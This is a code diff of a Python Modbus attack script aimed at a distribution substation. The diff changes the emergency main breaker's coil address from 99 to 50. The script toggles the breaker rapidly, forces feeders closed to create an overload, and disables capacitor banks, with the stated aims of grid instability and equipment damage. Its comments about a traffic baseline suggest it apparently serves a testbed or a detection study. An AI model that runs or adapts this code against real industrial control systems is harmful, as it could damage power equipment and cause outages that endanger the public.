@@ -3,7 +3,7 @@
 Distribution Substation Attack - Unauthorized Coil Manipulation
 
 Attack Objectives:
-1. Rapidly toggle emergency main breaker (coil 99) to cause grid instability
+1. Rapidly toggle emergency main breaker (coil 50) to cause grid instability
 2. Force all distribution feeders CLOSED simultaneously (overload condition)
 3. Disable capacitor banks during high load (power quality attack)
 4. Rapid successive writes with no operational delays (automation signature)
@@ -32,18 +32,18 @@ def main():
 
   # ATTACK PHASE 1: Emergency Main Breaker Rapid Toggling
   # This creates grid instability and potential equipment damage
-  print("[!] ATTACK PHASE 1: Rapidly toggling emergency main breaker (coil 99)...")
+  print("[!] ATTACK PHASE 1: Rapidly toggling emergency main breaker (coil 50)...")
   print("[!] Impact: Grid instability, potential cascade failures")
   for i in range(10):
 	  # Trip main breaker
-	  result = client.write_coil(address=99, value=True, slave=1)
+	  result = client.write_coil(address=50, value=True, slave=1)
 	  if not result.isError():
 		  print(f"[!] Iteration {i+1}: Emergency main breaker TRIPPED")
 
 	  time.sleep(0.3)  # Minimal delay (contrast with 2-second baseline)
 
 	  # Reset main breaker
-	  result = client.write_coil(address=99, value=False, slave=1)
+	  result = client.write_coil(address=50, value=False, slave=1)
 	  if not result.isError():
 		  print(f"[!] Iteration {i+1}: Emergency main breaker RESET")
 
@@ -104,7 +104,7 @@ def main():
 		  status = "CLOSED (ENERGIZED)" if state else "OPEN"
 		  print(f"    Feeder {i+1}: {status}")
 
-  result = client.read_coils(address=99, count=1, slave=1)
+  result = client.read_coils(address=50, count=1, slave=1)
   if not result.isError():
 	  emergency_state = result.bits[0]
 	  status = "TRIPPED" if emergency_state else "NORMAL"
